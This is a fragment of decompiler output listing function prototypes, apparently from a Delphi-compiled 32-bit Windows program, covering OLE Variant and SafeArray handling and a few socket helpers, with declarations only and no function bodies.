// int __usercall sub_40F8D0@<eax>(volatile __int32 *a1@<eax>, char a2@<dl>, __int32 a3@<ecx>);
int __far sub_410BD0(); // weak
int __far nullsub_3(); // weak
int sub_4111B0();
// int __usercall sub_4111BC@<eax>(char *a1@<eax>);
// SOCKET __usercall sub_411218@<eax>(char *a1@<eax>, u_short a2@<dx>, SOCKET *a3@<ecx>);
// int __usercall sub_4112D0@<eax>(SOCKET a1@<eax>);
// int __usercall sub_4112E0@<eax>(SOCKET a1@<eax>, char *a2@<edx>, int a3@<ebx>);
// _DWORD *__usercall sub_411360@<eax>(SOCKET a1@<eax>, char **a2@<edx>);
int sub_411390();
int sub_4119B0();
int sub_411F3C();
void sub_411F6C();
int sub_411F74();
void sub_411FA4();
// void __stdcall VariantInit(VARIANTARG *pvarg);
// HRESULT __stdcall VariantClear(VARIANTARG *pvarg);
// HRESULT __stdcall VariantCopy(VARIANTARG *pvargDest, const VARIANTARG *pvargSrc);
// HRESULT __stdcall VariantCopyInd(VARIANT *pvarDest, const VARIANTARG *pvargSrc);
// HRESULT __stdcall VariantChangeTypeEx(VARIANTARG *pvargDest, const VARIANTARG *pvarSrc, LCID lcid, USHORT wFlags, VARTYPE vt);
// SAFEARRAY *__stdcall SafeArrayCreate(VARTYPE vt, UINT cDims, SAFEARRAYBOUND *rgsabound);
// HRESULT __stdcall SafeArrayRedim(SAFEARRAY *psa, SAFEARRAYBOUND *psaboundNew);
// HRESULT __stdcall SafeArrayGetLBound(SAFEARRAY *psa, UINT nDim, LONG *plLbound);
// HRESULT __stdcall SafeArrayGetUBound(SAFEARRAY *psa, UINT nDim, LONG *plUbound);
// HRESULT __stdcall SafeArrayGetElement(SAFEARRAY *psa, LONG *rgIndices, void *pv);
// HRESULT __stdcall SafeArrayPutElement(SAFEARRAY *psa, LONG *rgIndices, void *pv);
// HRESULT __stdcall SafeArrayPtrOfIndex(SAFEARRAY *psa, LONG *rgIndices, void **ppvData);
int sub_41200C();
void sub_41203C();
void __thiscall __noreturn sub_412160(void *this);
void __thiscall __noreturn sub_412168(void *this);
void __thiscall __noreturn sub_412170(void *this);
// void __usercall sub_412178(VARIANTARG *a1@<eax>);
// VARIANTARG *__usercall sub_412180@<eax>(VARIANTARG *result@<eax>, int@<ecx>);
int sub_4121F8(VARIANTARG *a1, _WORD *a2, int a3, ...);
// int __usercall sub_412264@<eax>(int a1@<eax>, int a2@<edx>, int a3);
// int __usercall sub_4122C0@<eax>(VARIANTARG *a1@<eax>, const VARIANTARG *a2@<edx>, void (*a3)(void)@<ecx>);
int __fastcall sub_412480(int a1, int a2);
// VARIANTARG *__usercall sub_412494@<eax>(VARIANTARG *result@<eax>, int a2@<edx>, int a3@<ecx>);
// VARIANTARG *__usercall sub_4125AC@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>);
// VARIANTARG *__usercall sub_4125B4@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_4125BC@<eax>(int a1@<eax>, int a2@<edx>, void *a3@<ecx>);
// OLECHAR **__usercall sub_412758@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>, void *a3@<ecx>);
VARIANTARG *__fastcall sub_4128D0(int a1, int a2);
int __fastcall sub_412938(int a1, _WORD *a2);
// VARIANTARG *__usercall sub_412950@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>);
// char *__usercall sub_412AD8@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>);
// VARIANTARG *__usercall sub_412B08@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>);
// VARIANTARG *__usercall sub_412B28@<eax>(VARIANTARG *@<eax>, int@<edx>);
// VARIANTARG *__usercall sub_412B30@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>);
// VARIANTARG *__usercall sub_412C4C@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>);
// int __usercall sub_412CB4@<eax>(VARIANTARG *a1@<eax>);
// __int64 __usercall sub_412D90@<edx:eax>(VARIANTARG *a1@<eax>);
// BOOL __usercall sub_412EDC@<eax>(VARIANTARG *a1@<eax>);
// double __usercall sub_412F18@<st0>(VARIANTARG *a1@<eax>);
// double __usercall sub_413054@<st0>(VARIANTARG *a1@<eax>);
// VARIANTARG *__usercall sub_4131C8@<eax>(volatile __int32 *a1@<eax>, VARIANTARG *a2@<edx>);
// _DWORD *__usercall sub_41323C@<eax>(_BYTE *a1@<eax>, VARIANTARG *a2@<edx>);
// void __usercall sub_41328C(OLECHAR **a1@<eax>, VARIANTARG *a2@<edx>);
// VARIANTARG *__usercall sub_4132FC@<eax>(_DWORD *a1@<eax>, int a2@<edx>);
// VARIANTARG *__usercall sub_41336C@<eax>(_DWORD *a1@<eax>, unsigned __int16 *a2@<edx>, int *a3@<ecx>);
// _DWORD *__usercall sub_413410@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int *a3@<ecx>);
// int *__usercall sub_413494@<eax>(int *a1@<eax>, int a2@<edx>, __int32 a3@<ecx>);
// VARIANTARG *__usercall sub_4134A4@<eax>(VARIANTARG *result@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>);
// VARIANTARG *__usercall sub_413534@<eax>(VARIANTARG *result@<eax>, LONG a2@<edx>, int a3@<ecx>);
// LONG __userpurge sub_413554@<eax>(VARIANTARG *a1@<eax>, int a2@<ecx>, LONG a3, LONG a4);
// int __usercall sub_413580@<eax>(VARIANTARG *a1@<eax>, char a2@<dl>, int a3@<ecx>);
// VARIANTARG *__usercall sub_4135A8@<eax>(VARIANTARG *result@<eax>, int a2@<ecx>, DOUBLE a3@<st0>);
// VARIANTARG *__usercall sub_4135C0@<eax>(VARIANTARG *result@<eax>, int a2@<ecx>, DOUBLE a3@<st0>);
// VARIANTARG *__usercall sub_4135D8@<eax>(VARIANTARG *result@<eax>, int a2@<ecx>, double a3@<st0>);
// volatile __int32 *__usercall sub_4135F0@<eax>(VARIANTARG *a1@<eax>, __int32 a2@<edx>, int a3@<ecx>);
// _DWORD *__usercall sub_41361C@<eax>(VARIANTARG *a1@<eax>, char *a2@<edx>);
// void __usercall sub_41366C(VARIANTARG *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// _DWORD *__usercall sub_4136A4@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// _DWORD *__usercall sub_4136D0@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// _WORD *__usercall sub_4136FC@<eax>(_WORD *a1@<eax>, int *a2@<edx>, __int32 a3@<ecx>);
// OLECHAR **__usercall sub_413710@<eax>(VARIANTARG *a1@<eax>, const CHAR *a2@<edx>);
// _DWORD *__usercall sub_413760@<eax>(VARIANTARG *a1@<eax>, char *a2@<edx>);
// VARIANTARG *__usercall sub_4137B0@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>);
// int __usercall sub_413814@<eax>(int a1@<eax>, _WORD *a2@<edx>, int a3@<ecx>);
// VARIANTARG *__usercall sub_41385C@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>);
// int __usercall sub_413998@<eax>(_WORD *a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<esi>);
// VARIANTARG *__usercall sub_413A4C@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>);
int nullsub_6(void); // weak
// VARIANTARG *__usercall sub_413CC8@<eax>(_WORD *a1@<eax>, _WORD *a2@<edx>, int a3@<ecx>);
// unsigned int __usercall sub_413D54@<eax>(int a1@<eax>, void *a2@<ecx>, int a3);
// int __usercall sub_413D9C@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>);
// int __usercall sub_413E2C@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>);
// int __usercall sub_413F50@<eax>(CONTEXT *a1@<eax>, EXCEPTION_RECORD *a2@<edx>, int a3@<ecx>);
// int __usercall sub_41413C@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>, int a4@<esi>);
// char __usercall sub_414554@<al>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, unsigned int a3@<ecx>);
// char __usercall sub_414908@<al>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, unsigned int a3@<ecx>);
// unsigned int __usercall sub_414910@<eax>(int a1@<eax>, void *a2@<ecx>);
// char __usercall sub_414934@<al>(int a1@<eax>, int a2@<edx>);
char __stdcall sub_414948(__int64 a1, __int64 a2);
char __stdcall sub_414984(double a1, double a2);
// int __usercall sub_4149AC@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>);
// char __usercall sub_414A24@<al>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, void *a3@<ecx>);
// LONG __usercall sub_414B88@<eax>(VARIANTARG *a1@<eax>, void *a2@<ecx>);
// LONG __usercall sub_414BCC@<eax>(VARIANTARG *a1@<eax>, void *a2@<ecx>);
// int __usercall sub_414C98@<eax>(_WORD *a1@<eax>, void *a2@<ecx>);
// __int16 __usercall sub_414CDC@<ax>(int a1@<eax>, void *a2@<ecx>);
// VARIANTARG *__usercall sub_414D7C@<eax>(VARIANTARG *@<eax>, int@<edx>);
// VARIANTARG *__usercall sub_414D84@<eax>(VARIANTARG *result@<eax>);
// __int16 __usercall sub_414DA8@<ax>(int a1@<eax>);
// int __usercall sub_414DAC@<eax>(__int16 *a1@<eax>, int a2@<ecx>);
// int __usercall sub_414E10@<eax>(__int16 a1@<ax>, int a2@<ecx>);
// bool __usercall sub_414E3C@<al>(__int16 *a1@<eax>, _WORD *a2@<edx>);
// int __usercall sub_414E80@<eax>(int result@<eax>);
// int __usercall sub_414E90@<eax>(int a1@<eax>, _WORD *a2@<edx>, signed int a3@<ecx>);
// int __usercall sub_414F08@<eax>(int a1@<eax>, _WORD *a2@<edx>);
// int __usercall sub_414F10@<eax>(int a1@<eax>, int a2@<edx>, _DWORD *a3@<ecx>, int a4@<ebx>);
// VARIANTARG *__userpurge sub_414F5C@<eax>(LONG *a1@<eax>, int a2@<edx>, void *a3@<ecx>, VARIANTARG *a4);
// HRESULT __usercall sub_415008@<eax>(int a1@<eax>, int a2@<edx>);
// __int64 __usercall sub_41505C@<edx:eax>(int a1@<eax>);
// int __usercall sub_415084@<eax>(int a1@<eax>);
// LONG __usercall sub_4150AC@<eax>(int a1@<eax>, UINT a2@<edx>, LONG a3@<ecx>);
// LONG __usercall sub_4150D4@<eax>(int a1@<eax>, UINT a2@<edx>, LONG a3@<ecx>);
// char __usercall sub_4150FC@<al>(_WORD *a1@<eax>, int a2@<ebx>);
// char __usercall sub_415104@<al>(_WORD *a1@<eax>, char a2@<dl>, int a3@<ebx>);
// bool __usercall sub_41512C@<al>(__int16 a1@<ax>);
// bool __usercall sub_415150@<al>(__int16 a1@<ax>, int a2@<ecx>);
// VARIANTARG *__usercall sub_415188@<eax>(int a1@<ebx>, VARIANTARG *a2, int a3, int a4, LONG rgIndices);
// VARIANTARG *__userpurge sub_41525C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, VARIANTARG *a4);
// VARIANTARG *__usercall sub_415280@<eax>(int a1@<ebx>, int a2, VARIANTARG *a3, int a4, LONG rgIndices);
// VARIANTARG *__userpurge sub_4153C8@<eax>(int a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>, int a4);
// _DWORD *__userpurge sub_4153F0@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>, int **a4);
// int __usercall sub_415430@<eax>(int a1@<eax>);
// int __usercall sub_41544C@<eax>(_BYTE *a1@<eax>);
// int __usercall sub_415464@<eax>(int result@<eax>);
// int __usercall sub_41546C@<eax>(int *a1@<eax>, _BYTE *a2@<edx>);
// int *__usercall sub_4154D4@<eax>(_DWORD *a1@<eax>, _BYTE *a2@<edx>, int *a3@<ecx>);
// int __usercall sub_415528@<eax>(int *a1@<eax>, int a2@<edx>);
// int __usercall sub_415594@<eax>(_DWORD *a1@<eax>, _BYTE *a2@<edx>, int *a3@<ecx>);
// int __usercall sub_4155EC@<eax>(_BYTE *a1@<eax>);
// int *__usercall sub_415614@<eax>(__int32 a1@<eax>, int *a2@<edx>, __int32 a3@<ecx>);
// int *__usercall sub_415928@<eax>(int *a1@<eax>, int a2@<edx>, __int32 a3@<ecx>);
// _DWORD *__usercall sub_415C04@<eax>(int a1@<ebx>);
void __noreturn sub_415C74(); // weak
// int __usercall sub_415C80@<eax>(int a1@<eax>, int a2@<edx>, unsigned __int16 *a3@<ecx>);
// int __userpurge sub_415CB8@<eax>(int a1@<eax>, int a2@<edx>, unsigned __int16 *a3@<ecx>, int a4);
void __noreturn sub_415D00(); // weak
// char __userpurge sub_415D0C@<al>(int a1@<eax>, int a2);
// int __usercall sub_415D44@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// _DWORD *__usercall sub_415D80@<eax>(_DWORD *a1@<eax>, char a2@<dl>, int a3@<ebx>);
int sub_415E04();
// char __userpurge sub_415E08@<al>(int a1@<eax>, _WORD *a2);
char __thiscall sub_415E1C(_WORD *this);
void __noreturn sub_415E24(void); // weak
void __noreturn sub_415E2C(void); // weak
void __noreturn sub_415E34(void); // weak
// char __userpurge sub_415E3C@<al>(int a1@<eax>, _WORD *a2);
void __noreturn sub_415E58(); // weak
int __stdcall sub_415E7C(int *a1, _DWORD *a2, _DWORD *a3);
// char __usercall sub_415EA4@<al>(unsigned __int16 a1@<ax>, _DWORD *a2@<edx>);
// char __usercall sub_415F44@<al>(_BYTE *a1@<eax>, int **a2@<edx>);
// VARIANTARG *__usercall sub_41602C@<eax>(VARIANTARG *a1@<eax>, int a2@<ecx>);
// int __usercall sub_416040@<eax>(int a1@<ebx>);
int sub_4160A4();
int sub_416358();
void sub_416388();
// int __usercall sub_4163BC@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_4163C8@<eax>(int *a1@<eax>, int a2@<edx>, char **a3@<ecx>);
// int __usercall sub_4164BC@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_416508@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<edx>);
// int __usercall sub_41656C@<eax>(int result@<eax>, _BYTE *a2@<edx>);
// int __usercall sub_4165DC@<eax>(int a1@<eax>, void *a2@<edx>);
// char __usercall sub_416630@<al>(_DWORD *a1@<eax>, int a2@<edx>);
// char __usercall sub_416660@<al>(_DWORD *a1@<eax>, int a2@<edx>);
// _BYTE *__usercall sub_4166D4@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// _DWORD *__userpurge sub_416730@<eax>(_DWORD *result@<eax>, int a2@<edx>, char *a3@<ecx>, int a4);
// unsigned __int8 __usercall sub_416774@<al>(_DWORD *a1@<eax>, int **a2@<edx>, unsigned __int8 *a3@<ecx>);
// _DWORD *__usercall sub_4167C8@<eax>(_DWORD *a1@<eax>, int a2@<edx>, char **a3@<ecx>);
// unsigned __int8 __usercall sub_4167F0@<al>(_DWORD *a1@<eax>, int **a2@<edx>, char *a3@<ecx>);
// volatile __int32 *__usercall sub_416824@<eax>(volatile __int32 *a1@<eax>, __int32 a2@<edx>);
// volatile __int32 *__usercall sub_416838@<eax>(_DWORD *a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>);
// volatile __int32 *__usercall sub_416878@<eax>(_DWORD *a1@<eax>, int a2@<edx>, __int32 a3@<ecx>);
OLECHAR **__fastcall sub_4168B8(char **a1, int a2);
// OLECHAR **__usercall sub_416910@<eax>(_DWORD *a1@<eax>, int a2@<edx>, const CHAR *a3@<ecx>);
// OLECHAR **__usercall sub_416968@<eax>(_DWORD *a1@<eax>, _BYTE ***a2@<edx>, char **a3@<ecx>);
// char __usercall sub_4169A8@<al>(_DWORD *a1@<eax>, int **a2@<edx>, char *a3@<ecx>);
// _DWORD *__usercall sub_4169D4@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int *a3@<ecx>);
// _DWORD *__usercall sub_416ABC@<eax>(_DWORD *a1@<eax>, int a2@<edx>, const WCHAR *a3@<ecx>);
// double __usercall sub_416B90@<st0>(_DWORD *a1@<eax>, int a2@<edx>);
// __int16 __userpurge sub_416CA8@<ax>(_DWORD *a1@<eax>, int a2@<edx>, _TBYTE a3);
int __fastcall sub_416EA0(int a1, int a2);
// int __usercall sub_416EB4@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_416EF4@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// _DWORD *__usercall sub_416F34@<eax>(_DWORD *a1@<eax>, int a2@<edx>, _DWORD *a3@<ecx>);
// _DWORD *__usercall sub_416F74@<eax>(_DWORD *a1@<eax>, int a2@<edx>, _DWORD *a3@<ecx>);
// int __usercall sub_416FAC@<eax>(_DWORD *a1@<eax>, int a2@<edx>);
// _DWORD *__userpurge sub_416FD4@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3, int a4);
// _DWORD *__usercall sub_417010@<eax>(_DWORD *a1@<eax>, int a2@<edx>, _DWORD *a3@<ecx>);
// _DWORD *__usercall sub_417090@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>);
int sub_417104();
void sub_417154();
int sub_41715C();
void sub_41718C();
// _DWORD *__usercall sub_418240@<eax>(_DWORD *a1@<eax>, char a2@<dl>, int a3@<ecx>);
// _DWORD *__usercall sub_4182BC@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_4182FC@<eax>(int a1@<eax>, int a2@<edx>);
// bool __usercall sub_41835C@<al>(const void *a1@<eax>, PVOID a2@<edx>);
// char __usercall sub_41837C@<al>(int a1@<eax>, void *a2@<edx>);
// _DWORD *__usercall sub_418420@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// _DWORD *__usercall sub_418494@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_4184F0@<eax>(int a1@<eax>, int a2@<edx>);
// void __usercall sub_418534(int a1@<eax>);
// void __usercall sub_418540(int a1@<eax>);
// char __usercall sub_41854C@<al>(int a1@<eax>, void *a2@<edx>);
// int __usercall sub_41857C@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_418604@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_418610@<eax>(int a1@<eax>);
// int __usercall sub_41867C@<eax>(int a1@<eax>);
// void __usercall sub_4186D0(void *a1@<eax>);
// _DWORD *__userpurge sub_418774@<eax>(_DWORD *result@<eax>, char a2@<dl>, int a3@<ecx>, int a4, int a5);
// void __usercall sub_4187AC(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_4187D8@<eax>(int a1@<eax>);
// int __usercall sub_418854@<eax>(int a1@<eax>);
// char __userpurge sub_4188D0@<al>(_BYTE *a1@<eax>, _DWORD *a2@<edx>, int a3@<ecx>, int a4);
// char __userpurge sub_418910@<al>(int a1@<eax>, volatile __int32 *a2@<edx>, _DWORD *a3@<ecx>, int a4);
int sub_418954();
// _DWORD *__usercall sub_418994@<eax>(int a1@<eax>, int a2@<edx>, void (__stdcall **a3)(int *)@<ecx>);
// char __userpurge sub_418A00@<al>(int a1@<eax>, int a2@<edx>, void (__stdcall **a3)(int *)@<ecx>, void (__stdcall **a4)(int *));
// int __usercall sub_418B24@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_418B44@<eax>(_DWORD *a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_418B78@<eax>(_DWORD *a1@<eax>);
// int __usercall sub_418B90@<eax>(_DWORD *a1@<eax>, int a2@<edx>);
// int __usercall sub_418BF0@<eax>(int a1@<ebp>);
// int __usercall sub_418BF4@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<ebp>, int a5@<esi>, int a6, int a7, int a8, int a9);
_DWORD *__fastcall sub_418C2C(int a1, int **a2);
// int __usercall sub_418C80@<eax>(int a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_418CA8@<eax>(_DWORD *a1@<eax>);
// int __usercall sub_418CDC@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_418CFC@<eax>(int a1@<eax>);
// int __usercall sub_418D08@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_418D5C@<eax>(_DWORD *a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_418D7C@<eax>(_DWORD *result@<eax>, int a2@<edx>);
// __int16 __usercall sub_418DB8@<ax>(_DWORD *a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_418E2C@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// void __usercall sub_418E80(_DWORD *a1@<eax>, char a2@<dl>);
int __cdecl sub_418EE2(int, int);
// void __usercall sub_418EFC(int a1@<eax>, int a2@<edx>);
// int __usercall sub_418F84@<eax>(int a1@<eax>);
// void __usercall sub_418F98(int a1@<eax>, int a2@<edx>);
// void __usercall sub_418FE8(int a1@<eax>);
// _DWORD *__usercall sub_418FF4@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// _DWORD *__usercall sub_419020@<eax>(int *a1@<eax>, int (***a2)(void)@<edx>);
// _DWORD *__usercall sub_419034@<eax>(int *a1@<eax>, int *a2@<edx>);
// _DWORD *__usercall sub_419104@<eax>(int *a1@<eax>, int *a2@<edx>);
// _DWORD *__usercall sub_419110@<eax>(int *a1@<eax>, char **a2@<edx>);
// void __usercall sub_4191C4(int *a1@<eax>);
int __stdcall sub_419254(int *a1, _DWORD *a2, _DWORD *a3);
// unsigned __int8 __usercall sub_41927C@<al>(int a1@<eax>, _DWORD *a2@<edx>);
// _DWORD *__usercall sub_419314@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// _DWORD *__usercall sub_419378@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_4193C4@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_4193D0@<eax>(int *a1@<eax>, int (***a2)(void)@<edx>);
// int __usercall sub_419468@<eax>(int result@<eax>);
// _DWORD *__usercall sub_41946C@<eax>(_DWORD *result@<eax>);
// int __usercall sub_41947C@<eax>(int *a1@<eax>);
// _DWORD *__usercall sub_4194E4@<eax>(_DWORD *a1@<eax>);
_DWORD *__thiscall sub_4194F4(_DWORD *this);
// int __userpurge sub_419500@<eax>(int a1@<eax>, int a2@<ecx>, int a3);
// int __usercall sub_419520@<eax>(int a1@<eax>);
// int __usercall sub_419528@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_41953C@<eax>(int *a1@<eax>, char **a2@<edx>);
// volatile __int32 *__usercall sub_419604@<eax>(int *a1@<eax>, volatile __int32 *a2@<edx>);
// int __usercall sub_419730@<eax>(int result@<eax>, char a2@<cl>);
// _DWORD *__usercall sub_419754@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_419784@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_4197A8@<eax>(int a1@<eax>, int a2@<ecx>);
// _DWORD *__usercall sub_4197CC@<eax>(_DWORD *a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_419884@<eax>(int *a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_419914@<eax>(_DWORD *result@<eax>);
// int __usercall sub_41992C@<eax>(int a1@<ebx>, int a2);
// int __usercall sub_419984@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>);
// _DWORD *__usercall sub_4199D0@<eax>(_DWORD *result@<eax>);
// char __usercall sub_4199E4@<al>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_419A8C@<eax>(int a1@<ebp>);
// int __usercall sub_419A90@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<ebp>, int a5@<esi>, int a6, int a7, int a8, int a9);
// _DWORD *__usercall sub_419AC8@<eax>(int a1@<eax>, int **a2@<edx>, int a3@<ecx>);
// int __usercall sub_419B20@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_419C08@<eax>(int a1@<eax>);
int sub_419C10();
// char *__usercall sub_419C14@<eax>(int a1@<eax>);
// int __usercall sub_419C68@<eax>(int a1@<eax>, char **a2@<edx>);
// int __usercall sub_419D90@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_419E1C@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_419EE0@<eax>(int a1@<eax>, int a2@<edx>);
// int __userpurge sub_419F18@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4);
// _DWORD *__usercall sub_419F48@<eax>(int a1@<eax>, char *a2@<edx>);
// _DWORD *__usercall sub_419F9C@<eax>(_DWORD *a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_41A048@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_41A0F8@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// _DWORD *__usercall sub_41A12C@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edx>);
// _DWORD *__usercall sub_41A1DC@<eax>(int a1@<eax>, char *a2@<edx>);
// _DWORD *__usercall sub_41A234@<eax>(int a1@<eax>, int a2@<esi>);
// _DWORD *__usercall sub_41A294@<eax>(int a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_41A2C8@<eax>(int a1@<eax>, char *a2@<edx>);
// _DWORD *__usercall sub_41A318@<eax>(_DWORD *a1@<eax>, char *a2@<edx>);
// _DWORD *__usercall sub_41A3DC@<eax>(int a1@<eax>, _DWORD *a2@<edx>);
int __fastcall sub_41A460(char *a1, char *a2);
// int __usercall sub_41A46C@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_41A4C8@<eax>(int a1@<eax>);
// int __usercall sub_41A4D4@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_41A538@<eax>(int result@<eax>, int a2@<ecx>);
// int __usercall sub_41A554@<eax>(int result@<eax>, int a2@<ecx>);
// _DWORD *__usercall sub_41A570@<eax>(_DWORD *result@<eax>);
// int __usercall sub_41A5B0@<eax>(_DWORD *a1@<eax>, int a2@<edx>);
// int __usercall sub_41A61C@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int *__usercall sub_41A678@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// char __usercall sub_41A69C@<al>(int a1@<eax>, int a2@<edx>, signed int *a3@<ecx>);
// volatile __int32 *__usercall sub_41A714@<eax>(int a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>);
// int __usercall sub_41A748@<eax>(int a1@<eax>);
// int __usercall sub_41A74C@<eax>(int a1@<eax>);
// int __usercall sub_41A750@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_41A778@<eax>(int a1@<eax>);
// int __usercall sub_41A7AC@<eax>(_BYTE *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_41A7E8@<eax>(int a1@<eax>);
// int __userpurge sub_41A7F8@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4);
// int __userpurge sub_41A84C@<eax>(_DWORD *a1@<eax>, int a2@<edx>, __int32 a3@<ecx>, int a4);
// int __usercall sub_41A8C4@<eax>(int a1@<eax>, int a2@<edx>, __int32 a3@<ecx>);
// int __usercall sub_41A920@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int *__userpurge sub_41A960@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int (__fastcall *a4)(unsigned int, int));
// _DWORD *__usercall sub_41A9F4@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_41AA10@<eax>(int a1@<eax>, char a2@<dl>);
// int __usercall sub_41AA28@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_41AA3C@<eax>(int a1@<eax>);
// int __usercall sub_41AA4C@<eax>(int result@<eax>, int (__fastcall *a2)(unsigned int, int)@<edx>);
// int __usercall sub_41AA84@<eax>(int a1@<eax>, char *a2@<edx>, char *a3@<ecx>);
// __int64 __usercall sub_41AAA0@<edx:eax>(int a1@<eax>);
// int __userpurge sub_41AAC0@<eax>(int a1@<eax>, int a2, int a3);
// __int64 __usercall sub_41AAD4@<edx:eax>(int a1@<eax>);
// int __userpurge sub_41AB24@<eax>(int a1@<eax>, int a2, int a3);
_DWORD __stdcall sub_41AB38(_DWORD, _DWORD); // weak
int __cdecl sub_41AB8C(int a1);
// int __usercall sub_41ABD8@<eax>(int a1@<eax>, int a2@<edx>, __int16 a3@<cx>);
// __int64 __userpurge sub_41AC5C@<edx:eax>(int a1@<eax>, unsigned __int8 a2@<dl>, __int64 a3);
int __fastcall sub_41ACCC(_DWORD, _DWORD); // weak
int __fastcall sub_41AD04(_DWORD, _DWORD); // weak
// __int64 __userpurge sub_41AD3C@<edx:eax>(int a1@<eax>, int a2@<edx>, __int64 a3);
// _DWORD *__usercall sub_41AE30@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// _DWORD *__usercall sub_41AE8C@<eax>(_DWORD *a1@<eax>, char a2@<dl>, int a3@<ecx>);
// DWORD __usercall sub_41AEC8@<eax>(int a1@<eax>, void *a2@<edx>, DWORD a3@<ecx>);
// DWORD __usercall sub_41AED8@<eax>(int a1@<eax>, const void *a2@<edx>, DWORD a3@<ecx>);
// DWORD __userpurge sub_41AEE8@<eax>(int a1@<eax>, char a2@<dl>, LONG a3, LONG a4);
// int __usercall sub_41AF14@<eax>(int a1@<eax>, int a2@<edx>);
